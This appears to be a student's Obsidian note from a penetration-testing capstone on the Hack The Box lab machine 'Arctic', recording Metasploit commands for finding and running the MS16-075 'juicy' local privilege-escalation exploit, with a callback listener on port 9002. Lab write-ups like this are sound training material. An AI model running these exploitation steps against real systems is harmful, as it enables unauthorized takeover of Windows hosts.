- Got initial Foothold [[PNPT/WPE/Capstones/Arctic - HTB/Initial Foothold|Initial Foothold]]

# Enumeration
---
- Use metasploit's `multi/recon/local_exploit_suggester`
	- ![[Pasted image 20250419162108.png]]

# Exploitation
---
- Using `juicy`
	- `use exploit/windows/local/ms16_075_reflection_juicy`
	- `set lhost tun0`
	- `set lport 9002`
	- `set session 3`
	- `run`
- ![[Pasted image 20250419162212.png]]
- ![[Pasted image 20250419162221.png]]
- 